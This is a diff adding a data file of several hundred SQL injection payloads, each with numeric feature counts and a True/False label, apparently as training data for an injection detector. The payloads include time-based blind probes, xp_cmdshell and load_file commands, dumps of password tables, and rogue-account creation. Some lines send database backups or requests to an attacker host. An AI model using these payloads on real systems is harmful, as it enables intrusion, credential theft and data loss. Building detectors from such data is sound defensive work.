@@ -1,0 +1,421 @@
+sleep(__time__)#	1	0	2	16	0	False
+1 or sleep(__time__)#	1	1	2	21	2	False
+" or sleep(__time__)#	1	1	2	21	2	False
+' or sleep(__time__)#	2	1	2	21	2	False
+" or sleep(__time__)="	2	1	3	22	2	False
+' or sleep(__time__)='	2	1	3	22	2	False
+1) or sleep(__time__)#	1	1	2	22	2	False
+") or sleep(__time__)="	2	1	3	23	2	False
+') or sleep(__time__)='	2	1	3	23	2	False
+1)) or sleep(__time__)#	1	1	2	23	2	False
+")) or sleep(__time__)="	2	1	3	24	2	False
+')) or sleep(__time__)='	2	1	3	24	2	False
+;waitfor delay '0:0:__time__'--	2	0	2	31	2	False
+);waitfor delay '0:0:__time__'--	2	0	3	32	2	False
+';waitfor delay '0:0:__time__'--	2	0	2	32	2	False
+";waitfor delay '0:0:__time__'--	2	0	2	32	2	False
+');waitfor delay '0:0:__time__'--	2	0	3	33	2	False
+");waitfor delay '0:0:__time__'--	2	0	3	33	2	False
+));waitfor delay '0:0:__time__'--	2	0	3	33	2	False
+'));waitfor delay '0:0:__time__'--	2	0	3	34	2	False
+"));waitfor delay '0:0:__time__'--	2	0	3	34	2	False
+benchmark(10000000,md5(1))#	1	0	3	27	0	False
+1 or benchmark(10000000,md5(1))#	1	1	3	32	2	False
+" or benchmark(10000000,md5(1))#	1	1	3	32	2	False
+' or benchmark(10000000,md5(1))#	2	1	3	32	2	False
+1) or benchmark(10000000,md5(1))#	1	1	3	33	2	False
+") or benchmark(10000000,md5(1))#	1	1	3	33	2	False
+') or benchmark(10000000,md5(1))#	2	1	3	33	2	False
+1)) or benchmark(10000000,md5(1))#	1	1	3	34	2	False
+")) or benchmark(10000000,md5(1))#	1	1	3	34	2	False
+')) or benchmark(10000000,md5(1))#	2	1	3	34	2	False
+pg_sleep(__time__)--	1	0	2	20	0	False
+1 or pg_sleep(__time__)--	1	1	2	25	2	False
+" or pg_sleep(__time__)--	1	1	2	25	2	False
+' or pg_sleep(__time__)--	2	1	2	25	2	False
+1) or pg_sleep(__time__)--	1	1	2	26	2	False
+") or pg_sleep(__time__)--	1	1	2	26	2	False
+') or pg_sleep(__time__)--	2	1	2	26	2	False
+1)) or pg_sleep(__time__)--	1	1	2	27	2	False
+")) or pg_sleep(__time__)--	1	1	2	27	2	False
+')) or pg_sleep(__time__)--	2	1	2	27	2	False
+)%20or%20('x'='x	0	0	3	16	0	True
+%20or%201=1	0	0	1	11	0	True
+; execute immediate 'sel' || 'ect us' || 'er'	2	0	1	45	8	False
+benchmark(10000000,md5(1))#	1	0	3	27	0	False
+update	0	1	0	6	0	False
+";waitfor delay '0:0:__time__'--	2	0	2	32	2	False
+1) or pg_sleep(__time__)--	1	1	2	26	2	False
+||(elt(-3+5,bin(15),ord(10),hex(char(45))))	1	1	3	43	0	False
+"hi"") or (""a""=""a"	2	1	3	21	2	True
+delete	0	1	0	6	0	False
+like	0	0	0	4	0	False
+" or sleep(__time__)#	1	1	2	21	2	False
+pg_sleep(__time__)--	1	0	2	20	0	False
+*(|(objectclass=*))	0	0	3	19	0	False
+declare @q nvarchar (200) 0x730065006c00650063 ...	0	0	3	50	5	False
+ or 0=0 #	1	1	0	9	3	True
+insert	0	1	0	6	0	False
+1) or sleep(__time__)#	1	1	2	22	2	False
+) or ('a'='a	0	1	2	12	2	True
+; exec xp_regread	0	1	1	17	2	False
+*|	0	0	0	2	0	False
+@var select @var as var into temp end --	1	1	1	40	8	False
+1)) or benchmark(10000000,md5(1))#	1	1	3	34	2	False
+asc	0	0	0	3	0	False
+(||6)	0	0	2	5	0	False
+"a"" or 3=3--"	2	1	0	14	2	True
+" or benchmark(10000000,md5(1))#	1	1	3	32	2	False
+# from wapiti	1	0	0	13	2	False
+ or 0=0 --	1	1	0	10	3	True
+1 waitfor delay '0:0:10'--	2	0	0	26	3	False
+ or 'a'='a	0	1	0	10	2	True
+hi or 1=1 --"	2	1	0	13	3	True
+or a = a	1	1	1	8	3	True
+ union all select	0	2	0	17	3	False
+) or sleep(__time__)='	2	1	3	22	2	False
+)) or benchmark(10000000,md5(1))#	1	1	3	33	2	False
+hi' or 'a'='a	1	1	0	13	2	True
+0	0	0	0	1	0	False
+21 %	0	0	1	4	1	False
+limit	0	0	0	5	0	False
+ or 1=1	0	1	0	7	2	True
+ or 2 > 1	0	1	1	9	4	False
+")) or benchmark(10000000,md5(1))#	1	1	3	34	2	False
+print	0	0	0	5	0	False
+hi') or ('a'='a	1	1	2	15	2	True
+ or 3=3	0	1	0	7	2	True
+));waitfor delay '0:0:__time__'--	2	0	3	33	2	False
+a' waitfor delay '0:0:10'--	2	0	0	27	3	False
+1;(load_file(char(47,101,116,99,47,112,97,115, ...	0	1	3	50	1	False
+or%201=1	0	1	1	8	0	True
+1 or sleep(__time__)#	1	1	2	21	2	False
+or 1=1	0	1	0	6	1	True
+ and 1 in (select var from temp)--	1	2	2	34	7	False
+ or '7659'='7659	0	1	0	16	2	True
+ or 'text' = n'text'	2	1	1	20	4	True
+ --	1	0	0	3	1	False
+ or 1=1 or ''='	1	1	0	15	4	True
+declare @s varchar (200) select @s = 0x73656c6 ...	1	1	4	50	8	True
+exec xp	0	1	0	7	1	False
+; exec master..xp_cmdshell 'ping 172.10.1.255'--	2	1	1	48	4	False
+3.10e+17	0	0	0	8	0	False
+" or pg_sleep(__time__)--	1	1	2	25	2	False
+x' and email is null; --	2	1	1	24	5	False
+&	0	0	1	1	0	False
+admin' or '	1	1	0	11	2	False
+ or 'unusual' = 'unusual'	2	1	1	25	4	True
+//	0	0	0	2	0	False
+truncate	0	0	0	8	0	False
+1) or benchmark(10000000,md5(1))#	1	1	3	33	2	False
+\x27union select	0	1	0	16	1	False
+declare @s varchar(200) select @s = 0x77616974 ...	1	1	4	50	7	True
+tz_offset	0	0	0	9	0	False
+sqlvuln	0	0	0	7	0	False
+"));waitfor delay '0:0:__time__'--	2	0	3	34	2	False
+||6	0	0	0	3	0	False
+or%201=1 --	1	1	1	11	1	True
+%2a%28%7c%28objectclass%3d%2a%29%29	0	0	1	35	0	False
+or a=a	0	1	0	6	1	True
+) union select * from information_schema.tables;	0	2	3	48	5	False
+print @@variable	0	0	1	16	1	False
+or isnull(1/0) /*	1	1	2	17	2	False
+26 %	0	0	1	4	1	False
+" or "a"="a	2	1	1	11	2	True
+(sqlvuln)	0	0	2	9	0	False
+x' and members.email is null; --	2	1	1	32	5	False
+ or 1=1--	1	1	0	9	2	True
+ and 1=( if((load_file(char(110,46,101,120,11 ...	0	2	1	49	4	False
+0x770061006900740066006f0072002000640065006c00 ...	0	0	0	50	1	False
+%20'sleep%2050'	1	0	1	15	0	False
+as	0	0	0	2	0	False
+1)) or pg_sleep(__time__)--	1	1	2	27	2	False
+/**/or/**/1/**/=/**/1	0	0	0	21	0	True
+ union all select @@version--	1	2	1	29	4	False
+,@variable	0	0	2	10	0	False
+(sqlattempt2)	0	0	2	13	0	False
+ or (exists)	0	1	2	12	2	False
+t'exec master..xp_cmdshell 'nslookup www.googl ...	0	0	0	50	4	False
+%20$(sleep%2050)	0	0	3	16	0	False
+1 or benchmark(10000000,md5(1))#	1	1	3	32	2	False
+%20or%20''='	3	0	2	12	0	False
+||utl_http.request	0	0	0	18	0	False
+ or pg_sleep(__time__)--	1	1	2	24	2	False
+hi' or 'x'='x';	1	1	1	15	2	True
+") or sleep(__time__)="	2	1	3	23	2	False
+ or 'whatever' in ('whatever')	1	1	2	30	4	False
+; begin declare @var varchar(8000) set @var=' ...	1	1	4	49	7	False
+ union select 1,load_file('/etc/passwd'),1,1,1;	1	3	4	47	3	False
+0x77616974666f722064656c61792027303a303a313027 ...	0	0	0	50	1	False
+exec(@s)	0	1	3	8	0	False
+) or pg_sleep(__time__)--	1	1	2	25	2	False
+ union select	0	2	0	13	2	False
+ or sleep(__time__)#	1	1	2	20	2	False
+ select * from information_schema.tables--	1	1	1	42	4	False
+a' or 1=1--	2	1	0	11	2	True
+a' or 'a' = 'a	2	1	1	14	4	True
+declare @s varchar(22) select @s =	1	1	4	34	5	False
+ or 2 between 1 and 3	0	2	0	21	6	False
+ or a=a--	1	1	0	9	2	True
+ or '1'='1	0	1	0	10	2	True
+|	0	0	0	1	0	False
+ or sleep(__time__)='	2	1	3	21	2	False
+ or 1 --'	2	1	0	9	3	False
+or 0=0 #"	2	1	0	9	2	True
+having	0	0	0	6	0	False
+a'	1	0	0	2	0	False
+" or isnull(1/0) /*	1	1	2	19	3	False
+declare @s varchar (8000) select @s = 0x73656c ...	1	1	4	50	8	True
+ or 1=1 --	1	1	0	10	3	True
+char%4039%41%2b%40select	0	0	1	24	0	False
+order by	0	0	0	8	1	False
+bfilename	0	0	0	9	0	False
+ having 1=1--	1	0	0	13	2	True
+) or benchmark(10000000,md5(1))#	1	1	3	32	2	False
+ or username like char(37);	0	1	3	27	4	False
+;waitfor delay '0:0:__time__'--	2	0	2	31	2	False
+" or 1=1--	1	1	0	10	2	True
+x' and userid is null; --	2	1	1	25	5	False
+*/*	0	0	0	3	0	False
+ or 'text' > 't'	1	1	1	16	4	False
+ (select top 1	0	1	1	14	3	False
+ or benchmark(10000000,md5(1))#	1	1	3	31	2	False
+");waitfor delay '0:0:__time__'--	2	0	3	33	2	False
+a' or 3=3--	2	1	0	11	2	True
+ -- &password=	1	0	1	14	2	False
+ group by userid having 1=1--	1	0	0	29	5	True
+ or ''='	1	1	0	8	2	False
+; exec master..xp_cmdshell	0	1	1	26	2	False
+%20or%20x=x	0	0	1	11	0	True
+select	0	1	0	6	0	False
+")) or sleep(__time__)="	2	1	3	24	2	False
+0x730065006c0065006300740020004000400076006500 ...	0	0	0	50	1	False
+hi' or 1=1 --	2	1	0	13	3	True
+") or pg_sleep(__time__)--	1	1	2	26	2	False
+%20or%20'x'='x	0	0	1	14	0	True
+ or 'something' = 'some'+'thing'	2	1	1	32	4	True
+exec sp	0	1	0	7	1	False
+29 %	0	0	1	4	1	False
+(	0	0	1	1	0	False
+1 or pg_sleep(__time__)--	1	1	2	25	2	False
+0 or 1=1	0	1	0	8	2	True
+) or (a=a	0	1	2	9	2	True
+uni/**/on sel/**/ect	0	0	0	20	1	False
+replace	0	0	0	7	0	False
+%27%20or%201=1	0	0	1	14	0	True
+)) or pg_sleep(__time__)--	1	1	2	26	2	False
+%7c	0	0	1	3	0	False
+x' and 1=(select count(*) from tabname); --	2	2	4	43	6	False
+&apos;%20or	0	0	3	11	0	False
+; or '1'='1'	1	1	1	12	2	True
+declare @q nvarchar (200) select @q = 0x770061 ...	1	1	4	50	8	True
+1 or 1=1	0	1	0	8	2	True
+; exec ('sel' + 'ect us' + 'er')	1	1	4	32	7	False
+23 or 1=1	0	1	0	9	2	True
+/	0	0	1	1	0	False
+anything' or 'x'='x	1	1	0	19	2	True
+declare @q nvarchar (4000) select @q =	1	1	4	38	6	False
+or 0=0 --	1	1	0	9	2	True
+desc	0	0	0	4	0	False
+||'6	0	0	0	4	0	False
+)	0	0	1	1	0	False
+1)) or sleep(__time__)#	1	1	2	23	2	False
+or 0=0 #	1	1	0	8	2	True
+ select name from syscolumns where id = (sele ...	1	1	2	49	9	True
+hi or a=a	0	1	0	9	2	True
+*(|(mail=*))	0	0	3	12	0	False
+password:*/=1--	1	0	1	15	0	False
+distinct	0	0	0	8	0	False
+);waitfor delay '0:0:__time__'--	2	0	3	32	2	False
+to_timestamp_tz	0	0	0	15	0	False
+") or benchmark(10000000,md5(1))#	1	1	3	33	2	False
+ union select	0	2	0	13	2	False
+%2a%28%7c%28mail%3d%2a%29%29	0	0	1	28	0	False
++sqlvuln	0	0	0	8	0	False
+ or 1=1 /*	1	1	0	10	3	True
+)) or sleep(__time__)='	2	1	3	23	2	False
+or 1=1 or ""=	2	1	1	13	3	True
+ or 1 in (select @@version)--	1	2	3	29	5	False
+sqlvuln;	0	0	1	8	0	False
+ union select * from users where login = char ...	1	2	2	49	10	True
+x' or 1=1 or 'x'='y	1	1	0	19	4	True
+28 %	0	0	1	4	1	False
+ or 3=3 --	1	1	0	10	3	True
+@variable	0	0	1	9	0	False
+ or '1'='1'--	2	1	0	13	2	True
+"a"" or 1=1--"	2	1	0	14	2	True
+//*	0	0	0	3	0	False
+%2a%7c	0	0	1	6	0	False
+" or 0=0 --	1	1	0	11	3	True
+")) or pg_sleep(__time__)--	1	1	2	27	2	False
+?	0	0	1	1	0	False
+ or 1/*	0	1	0	7	2	False
+!	0	0	1	1	0	False
+'	1	0	0	1	0	False
+ or a = a	1	1	1	9	4	True
+declare @q nvarchar (200) select @q = 0x770061006900740066006f0072002000640065006c00610079002000270030003a0030003a0031003000270000 exec(@q)	1	2	4	139	8	True
+declare @s varchar(200) select @s = 0x77616974666f722064656c61792027303a303a31302700 exec(@s) 	1	2	4	94	8	True
+declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)	0	1	3	101	5	False
+declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)	1	2	4	80	8	True
+' or 1=1	1	1	0	8	2	True
+ or 1=1 --	1	1	0	10	3	True
+x' or full_name like '%bob%	1	1	1	27	4	False
+'; exec master..xp_cmdshell 'ping 172.10.1.255'--	2	1	1	49	4	False
+'%20or%20''='	3	0	2	13	0	False
+'%20or%20'x'='x	1	0	1	15	0	True
+')%20or%20('x'='x	1	0	3	17	0	True
+' or 0=0 --	2	1	0	11	3	True
+' or 0=0 #	2	1	0	10	3	True
+ or 0=0 #"	2	1	0	10	3	True
+' or 1=1--	2	1	0	10	2	True
+' or '1'='1'--	2	1	0	14	2	True
+' or 1 --'	2	1	0	10	3	False
+or 1=1--	1	1	0	8	1	True
+' or 1=1 or ''='	1	1	0	16	4	True
+ or 1=1 or ""=	2	1	1	14	4	True
+' or a=a--	2	1	0	10	2	True
+ or a=a	0	1	0	7	2	True
+') or ('a'='a	1	1	2	13	2	True
+'hi' or 'x'='x';	1	1	1	16	2	True
+or	0	1	0	2	0	False
+procedure	0	0	0	9	0	False
+handler	0	0	0	7	0	False
+' or username like '%	1	1	1	21	4	False
+' or uname like '%	1	1	1	18	4	False
+' or userid like '%	1	1	1	19	4	False
+' or uid like '%	1	1	1	16	4	False
+' or user like '%	1	1	1	17	4	False
+'; exec master..xp_cmdshell	1	1	1	27	2	False
+'; exec xp_regread	1	1	1	18	2	False
+t'exec master..xp_cmdshell 'nslookup www.google.com'--	2	0	0	54	3	False
+--sp_password	1	0	0	13	0	False
+' union select	1	2	0	14	2	False
+' union all select	1	2	0	18	3	False
+' or (exists)	1	1	2	13	2	False
+' (select top 1	1	1	1	15	3	False
+'||utl_http.request	0	0	0	19	0	False
+1;select%20*	0	1	2	12	0	False
+<>"'%;)(&+	2	0	8	10	0	False
+'%20or%201=1	1	0	1	12	0	True
+'sqlattempt1	0	0	0	12	0	False
+%28	0	0	1	3	0	False
+%29	0	0	1	3	0	False
+%26	0	0	1	3	0	False
+%21	0	0	1	3	0	False
+' or ''='	1	1	0	9	2	False
+' or 3=3	1	1	0	8	2	True
+ or 3=3 --	1	1	0	10	3	True
+'; exec master..xp_cmdshell 'ping 10.10.1.2'--	2	1	1	46	4	False
+'create user name identified by 'pass123' --	2	0	0	44	6	False
+'create user name identified by pass123 temporary tablespace temp default tablespace users; 	0	0	1	92	12	False
+' ; drop table temp --	2	1	1	22	5	False
+'exec sp_addlogin 'name' , 'password' --	2	0	1	40	5	False
+' exec sp_addsrvrolemember 'name' , 'sysadmin' --	2	1	1	49	6	False
+' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --	2	1	3	100	11	False
+' grant connect to name; grant resource to name; --	2	0	1	51	9	False
+' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)	1	1	4	190	25	False
+' or 1=1 --	2	1	0	11	3	True
+' union (select @@version) --	2	2	3	29	4	False
+' union (select null, (select @@version)) --	2	2	4	44	6	False
+' union (select null, null, (select @@version)) --	2	2	4	50	7	False
+' union (select null, null, null,  (select @@version)) --	2	2	4	57	9	False
+' union (select null, null, null, null,  (select @@version)) --	2	2	4	63	10	False
+' union (select null, null, null, null,  null, (select @@version)) --	2	2	4	69	11	False
+select @@version	0	1	1	16	1	False
+select @@servernamee	0	1	1	20	1	False
+select @@microsoftversione	0	1	1	26	1	False
+select * from master..sysserverse	0	1	1	33	3	False
+select * from sysusers	0	1	1	22	3	False
+exec master..xp_cmdshell 'ipconfig+/all'		1	1	0	41	2	False
+exec master..xp_cmdshell 'net+view'	1	1	0	35	2	False
+exec master..xp_cmdshell 'net+users'	1	1	0	36	2	False
+exec master..xp_cmdshell 'ping+<attackerip>'	1	1	2	44	2	False
+backup database master to disks='\\<attackerip>\<attackerip>\backupdb.dat'	1	1	3	74	4	False
+create table myfile (line varchar(8000))" bulk insert foo from 'c:\inetpub\wwwroot\auth.aspâ'" select * from myfile"--	3	3	4	118	13	False
+1'1	0	0	0	3	0	False
+1 exec sp_ (or exec xp_)	0	2	2	24	5	False
+1 and 1=1	0	1	0	9	2	True
+1' and 1=(select count(*) from tablenames); --	2	2	4	46	6	False
+1 or 1=1	0	1	0	8	2	True
+1' or '1'='1	1	1	0	12	2	True
+create table myfile (input text); load data infile '<filepath>' into table myfile; select * from myfile;	1	2	6	104	15	False
+or 1=1--	1	1	0	8	1	True
+'or '' = '	3	0	1	10	3	True
+'--	2	0	0	3	0	False
+' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--	2	2	3	60	6	False
+'or 1=1--	1	0	0	9	1	True
+’ or ‘1’=’1	1	1	1	11	2	True
+' or '1'='1	1	1	0	11	2	True
+'||utl_http.request('http://192.168.1.1/')||'	2	0	3	45	0	False
+' || myappadmin.adduser('admin', 'newpass') || '	2	0	3	48	5	False
+' and 1=utl_inaddr.get_host_address((select banner from v$version where rownum=1)) and 'i'='i	1	2	2	93	9	True
+' and 1=utl_inaddr.get_host_address((select sys.login_user from dual)) and 'i'='i	1	2	2	81	7	True
+' and 1=utl_inaddr.get_host_address((select sys.database_name from dual)) and 'i'='i	1	2	2	84	7	True
+' and 1=utl_inaddr.get_host_address((select host_name from v$instance)) and 'i'='i	1	2	2	82	7	True
+' and 1=utl_inaddr.get_host_address((select global_name from global_name)) and 'i'='i	1	2	2	85	7	True
+' and 1=utl_inaddr.get_host_address((select count(distinct(username)) from sys.all_users)) and 'i'='i	1	2	2	101	7	True
+' and 1=utl_inaddr.get_host_address((select count(distinct(password)) from sys.user$)) and 'i'='i	1	2	2	97	7	True
+' and 1=utl_inaddr.get_host_address((select count(distinct(table_name)) from sys.all_tables)) and 'i'='i	1	2	2	104	7	True
+' and 1=utl_inaddr.get_host_address((select count(distinct(column_name)) from sys.all_tab_columns)) and 'i'='i	1	2	2	110	7	True
+' and 1=utl_inaddr.get_host_address((select count(distinct(granted_role)) from dba_role_privs where grantee=sys.login_user)) and 'i'='i	1	2	2	135	9	True
+' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=1)) and 'i'='i	1	2	3	158	15	True
+' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=1)) and 'i'='i	1	2	3	154	15	True
+' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=1)) and 'i'='i	1	2	3	163	15	True
+' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=1)) and 'i'='i	1	2	3	166	15	True
+' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=1)) and 'i'='i	1	2	3	195	17	True
+' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=2)) and 'i'='i	1	2	3	158	15	True
+' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=2)) and 'i'='i	1	2	3	154	15	True
+' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=2)) and 'i'='i	1	2	3	163	15	True
+' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=2)) and 'i'='i	1	2	3	166	15	True
+' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=2)) and 'i'='i	1	2	3	195	17	True
+' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=3)) and 'i'='i	1	2	3	158	15	True
+' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=3)) and 'i'='i	1	2	3	154	15	True
+' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=3)) and 'i'='i	1	2	3	163	15	True
+' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=3)) and 'i'='i	1	2	3	166	15	True
+' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=3)) and 'i'='i	1	2	3	195	17	True
+' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=4)) and 'i'='i	1	2	3	158	15	True
+' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=4)) and 'i'='i	1	2	3	154	15	True
+' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=4)) and 'i'='i	1	2	3	163	15	True
+' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=4)) and 'i'='i	1	2	3	166	15	True
+' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=4)) and 'i'='i	1	2	3	195	17	True
+' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=5)) and 'i'='i	1	2	3	158	15	True
+' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=5)) and 'i'='i	1	2	3	154	15	True
+' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=5)) and 'i'='i	1	2	3	163	15	True
+' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=5)) and 'i'='i	1	2	3	166	15	True
+' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=5)) and 'i'='i	1	2	3	195	17	True
+' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=6)) and 'i'='i	1	2	3	158	15	True
+' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=6)) and 'i'='i	1	2	3	154	15	True
+' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=6)) and 'i'='i	1	2	3	163	15	True
+' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=6)) and 'i'='i	1	2	3	166	15	True
+' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=6)) and 'i'='i	1	2	3	195	17	True
+' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=7)) and 'i'='i	1	2	3	158	15	True
+' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=7)) and 'i'='i	1	2	3	154	15	True
+' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=7)) and 'i'='i	1	2	3	163	15	True
+' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=7)) and 'i'='i	1	2	3	166	15	True
+' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=7)) and 'i'='i	1	2	3	195	17	True
+' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=8)) and 'i'='i	1	2	3	158	15	True
+' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=8)) and 'i'='i	1	2	3	154	15	True
+' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=8)) and 'i'='i	1	2	3	163	15	True
+' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=8)) and 'i'='i	1	2	3	166	15	True
+' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=8)) and 'i'='i	1	2	3	195	17	True
+select version();		0	1	3	18	1	False
+select current_database();	0	1	3	26	1	False
+select current_user;	0	1	1	20	1	False
+select session_user;	0	1	1	20	1	False
+select current_setting('log_connections');	1	1	3	42	1	False
+select current_setting('log_statement');	1	1	3	40	1	False
+select current_setting('port');	1	1	3	31	1	False
+select current_setting('password_encryption');	1	1	3	46	1	False
+select current_setting('krb_server_keyfile');	1	1	3	45	1	False
+select current_setting('virtual_host');	1	1	3	39	1	False
+select current_setting('port');	1	1	3	31	1	False
+select current_setting('config_file');	1	1	3	38	1	False
+select current_setting('hba_file');	1	1	3	35	1	False
+select current_setting('data_directory');	1	1	3	41	1	False
+select * from pg_shadow;	0	1	2	24	3	False
+select * from pg_group;	0	1	2	23	3	False
+create table myfile (input text);	0	1	3	33	4	False
+copy myfile from '/etc/passwd'; 	1	0	1	32	4	False
+select * from myfile;copy myfile to /tmp/test;	0	1	2	46	6	False
+sleep(1) /*‘ or sleep(1) or ‘“ or sleep(1) or “*/	1	1	2	49	9	False
+sleep(1) /*' or sleep(1) or '" or sleep(1) or "*/	3	1	2	49	9	False
